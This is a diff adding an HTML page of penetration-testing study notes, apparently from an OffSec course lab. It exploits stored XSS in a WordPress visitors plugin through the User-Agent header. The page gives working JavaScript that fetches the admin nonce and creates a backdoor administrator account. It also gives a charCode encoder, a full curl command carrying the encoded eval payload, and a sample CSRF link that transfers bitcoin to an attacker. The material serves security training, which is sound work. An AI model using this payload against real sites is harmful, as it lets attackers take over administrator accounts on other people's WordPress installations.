+            &lt;td scope=&quot;row&quot; &gt;&lt;a href=&quot;https://www.geolocation.com/es?ip=&#39;.$record-&gt;ip.&#39;#ipresult&quot;&gt;&#39;.$record-&gt;ip.&#39;&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&#39;.$record-&gt;useragent.&#39;&lt;/td&gt;
+        &lt;/tr&gt;&#39;;
+    $i--;
+}
+</code></pre>
+<p>From the above code, we&#39;ll notice that the useragent record value is retrieved from the database and inserted plainly in the Table Data (td) HTML tag, without any sort of data sanitization.</p>
+<p>As the User-Agent header is under user control, we could craft an XSS attack by inserting a script tag invoking the alert() method to generate a pop-up message. Given the immediate visual impact, this method is very commonly used to verify that an application is vulnerable to XSS.
+-	Although we just performed a white-box testing approach, we could have discovered the same vulnerability by testing the plugin through black-box HTTP header fuzzing.</p>
+<p>With Burp configured as a proxy and Intercept disabled, we can start our attack by first browsing to <a href="http://offsecwp/">http://offsecwp/</a> using Firefox.</p>
+<p>We&#39;ll then go to Burp Proxy &gt; HTTP History, right-click on the request, and select Send to Repeater.</p>
+<p>Moving to the Repeater tab, we can replace the default User-Agent value with the a script tag that includes the alert method (<script>alert(42)</script>), then send the request.
+<img src="../_resources/9fc073adaf330bd5307cd7f57e30a8b1.png" alt="9fc073adaf330bd5307cd7f57e30a8b1.png"></p>
+<p>If the server responds with a 200 OK message, we should be confident that our payload is now stored in the WordPress database.</p>
+<p>To verify this, let&#39;s log in to the admin console at <a href="http://offsecwp/wp-login.php">http://offsecwp/wp-login.php</a> using the admin/password credentials.</p>
+<p>If we navigate to the Visitors plugin console at <a href="http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php">http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php</a>, we are greeted with a pop-up banner showing the number 42, proving that our code injection worked.
+<img src="../_resources/81d8b7fd4b669031e95dc1dd84c46b70.png" alt="81d8b7fd4b669031e95dc1dd84c46b70.png">
+Excellent. We have injected an XSS payload into the web application&#39;s database and it will be served to any administrator that loads the plugin. A simple alert window is a somewhat trivial example of what can be done with XSS, so let’s try something more interesting, like creating a new administrative account.</p>
+<h6>Privilege Escalation via XSS</h6>
+<ul>
+<li>We could leverage our XSS to steal cookies and session information .</li>
+<li>If the application uses an insecure session management configuration.<ul>
+<li>IF we can steal an authenticated user&#39;s cookie, we could masquerade as that user within the target web site.</li>
+</ul>
+</li>
+<li>Websites use cookies to track state and information about users.</li>
+<li>Cookies can be set with several optional flags.</li>
+<li>Two that are interesting to penetration testers: <code>Secure</code> and <code>HttpOnly</code></li>
+<li>The <code>Secure</code> flag instructs the browser to only send the cookie over encrypted HTTPS connections.</li>
+<li>This protects the cookie from being sent in clear text and captured over the network.</li>
+<li><code>HttpOnly</code> flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.</li>
+</ul>
+<p>Let&#39;s verify the nature of WordPress&#39; session cookies by first logging in as the admin user.</p>
+<p>Next, we can open the Web Developer Tools, navigate to the Storage tab, then click on <a href="http://offsecwp">http://offsecwp</a> under the Cookies menu on the left.  notice that our browser has stored six different cookies, but only four are session cookies. Of these four cookies, if we exclude the negligible wordpress_test_cookie, all support the HttpOnly feature.</p>
+<p>Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be retrieved via JavaScript through our attack vector. We&#39;ll need to find a new angle.</p>
+<p>When the admin loads the Visitors plugin dashboards that contains the injected JavaScript, it executes whatever we provided as a payload, be it an alert pop-up banner or a more complex JavaScript function.</p>
+<p>For instance, we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.</p>
+<p>In order to succeed with our attack angle, we need to cover another web application attack class.</p>
+<p>To develop this attack, we&#39;ll build a similar scenario as depicted by <a href="https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/">Shift8</a>. First, we&#39;ll create a JS function that fetches the WordPress admin <a href="https://developer.wordpress.org/reference/functions/wp_nonce_field/">nonce</a></p>
+<ul>
+<li>Nonce is a server-generated token that is included in each HTTP request.</li>
+<li>Add randomness and prevent <a href="https://owasp.org/www-community/attacks/csrf">Cross-Site-Request-Forgery (CSRF) attacks</a></li>
+<li>CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.</li>
+</ul>
+<p>The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.</p>
+<pre><code>&lt;a href=&quot;http://fakecryptobank.com/send_btc?account=ATTACKER&amp;amount=100000&quot;&quot;&gt;Check out these awesome cat memes!&lt;/a&gt;
+</code></pre>
+<p>In the above example, the URL link is pointing to a Fake Crypto Bank website API, which performs a bitcoin transfer to the attacker account. If this link was embedded into the HTML code of an email, the user would be only able to see the link description, but not the actual HTTP resource it is pointing to. This <strong>attack would be successful if the user is already logged in with a valid session on the same website</strong>.</p>
+<ul>
+<li>By including and checking the pseudo-random nonce, WordPress prevents this kind of attack.</li>
+<li>An attacker could not have prior knowledge of the token.</li>
+<li>The nonce won&#39;t be an obstacle for the stored XSS vulnerability we discovered in the plugin.</li>
+</ul>
+<p><strong>First, gather the nonce</strong>
+As mentioned, in order to perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:</p>
+<pre><code>var ajaxRequest = new XMLHttpRequest();
+var requestURL = &quot;/wp-admin/user-new.php&quot;;
+var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;
+ajaxRequest.open(&quot;GET&quot;, requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+</code></pre>
+<p>This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string /ser&quot; value=&quot; and double quotes.</p>
+<p><strong>Next, craft main function for creating admin user</strong></p>
+<pre><code>var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;
+</code></pre>
+<p>New backdoored admin account, below, just after nonce we obtained, above :</p>
+<pre><code>user_login=attacker&amp;email=attacker@offsec.com&amp;pass1=attackerpass&amp;pass2=attackerpass&amp;role=administrator&quot;;
+</code></pre>
+<pre><code>ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open(&quot;POST&quot;, requestURL, true);
+ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+ajaxRequest.send(params);
+</code></pre>
+<p><strong>Minify and encode</strong>
+To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it.  To minify our attack code into a one-liner, we can navigate to <a href="https://jscompress.com/">JS Compress</a>.  Once we have clicked on Compress JavaScript, we&#39;ll copy the output and save it locally.Encode w</p>
+<p><strong>Final step</strong>
+we are going to encode the minified JavaScript code, so any bad characters won&#39;t interfere with sending the payload. We can do this using the following function:</p>
+<pre><code>function encode_to_javascript(string) {
+            var input = string
+            var output = &#39;&#39;;
+            for(pos = 0; pos &lt; input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += &quot;,&quot;;
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript(&#39;insert_minified_javascript&#39;)
+console.log(encoded)
+</code></pre>
+<p>The encode_to_javascript function will parse the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt">charCodeAt</a> method.</p>
+<p><strong>Decoding and running</strong>
+Let&#39;s run the function from the browser&#39;s console.  We decode with <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">fromCharCode</a> and then running with <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval()</a>.  </p>
+<p><strong>NOTE:</strong> <code>eval()</code> AKA <code>evil</code> is responsible for interpreting string as code and executing it.</p>
+<p>The encoded string can be inserted into the following cURL command to launch the attack:</p>
+<pre><code class="language-bash">kali@kali:~$ curl -i http://offsecwp --user-agent &quot;&lt;script&gt;eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))&lt;/script&gt;&quot; --proxy 127.0.0.1:8080
+</code></pre>
+<p>We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further.</p>
+<p>After running the curl command, we can inspect the request in Burp.  Everything seems correct, so let&#39;s forward the request by clicking Forward, then disabling Intercept.  At this point, our XSS exploit should have been stored in the WordPress database. We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.</p>
+<p>We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into <code>&quot;&lt;script&gt;&quot;</code> tags, so the browser cannot render any string from it.</p>
+<p>By loading the plugin statistics, we should have executed the malicious script, so let&#39;s verify if our attack succeeded by clicking on the Users menu on the left pane.  </p>
+<p>Excellent! Due to this XSS flaw, we managed to elevate our application privileges from a standard user to administrator via a specially-crafted HTTP request.</p>
+<p>We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell. We&#39;ll cover web shells more in-depth in an another Module.</p>
+
+      </div>
+    </article>
+  
